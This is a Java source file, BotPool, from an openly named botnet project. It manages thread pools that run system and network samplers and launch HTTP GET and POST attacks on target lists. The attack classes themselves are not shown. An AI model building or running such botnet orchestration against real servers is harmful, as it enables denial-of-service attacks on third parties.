/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.bot;

import com.acmutv.botnet.attack.HttpAttack;
import com.acmutv.botnet.attack.HttpGetAttack;
import com.acmutv.botnet.attack.HttpPostAttack;
import com.acmutv.botnet.bot.task.ExecutorServiceKill;
import com.acmutv.botnet.bot.task.ExecutorServiceShutdown;
import com.acmutv.botnet.report.statistics.NetworkSampler;
import com.acmutv.botnet.report.statistics.SystemSampler;
import com.acmutv.botnet.target.HttpTarget;
import com.acmutv.botnet.tool.RuntimeManager;
import lombok.Data;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes bot's thread pool, both fixed and scheduled.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see ExecutorService
 */
@Data
public class BotPool {

  private static final Logger LOGGER = LogManager.getLogger(BotPool.class);

  public static final int SHUTDOWN_TIMEOUT_AMOUNT = 60;
  public static final TimeUnit SHUTDOWN_TIMEOUT_UNIT = TimeUnit.SECONDS;

  private ExecutorService fixedThreadPool;
  private ScheduledExecutorService scheduledThreadPool;

  public BotPool() {
    int cores = RuntimeManager.getCores();
    this.fixedThreadPool = Executors.newFixedThreadPool(cores);
    this.scheduledThreadPool = Executors.newScheduledThreadPool(1);
  }

  public void registerSystemSampler(long frequency, TimeUnit unit) {
    SystemSampler sampler = new SystemSampler();
    this.getScheduledThreadPool().scheduleAtFixedRate(sampler, 0, frequency, unit);
  }

  public void registerNetworkSampler(long frequency, TimeUnit unit) {
    NetworkSampler sampler = new NetworkSampler();
    this.getScheduledThreadPool().scheduleAtFixedRate(sampler, 0, frequency, unit);
  }

  public void registerHttpGetAttack(HttpTarget...targets) {
    for (HttpTarget target : targets) {
      HttpAttack attacker = new HttpGetAttack(target);
      this.getFixedThreadPool().submit(attacker);
    }
  }

  public void registerHttpPostAttack(HttpTarget...targets) {
    for (HttpTarget target : targets) {
      HttpAttack attacker = new HttpPostAttack(target);
      this.getFixedThreadPool().submit(attacker);
    }
  }

  public void shutdown(long amount, TimeUnit unit) {
    new Thread(new ExecutorServiceShutdown(this.getFixedThreadPool(), amount, unit)).start();
    new Thread(new ExecutorServiceShutdown(this.getScheduledThreadPool(), amount, unit)).start();
  }

  public void kill() {
    new Thread(new ExecutorServiceKill(this.getFixedThreadPool())).start();
    new Thread(new ExecutorServiceKill(this.getScheduledThreadPool())).start();
  }
}
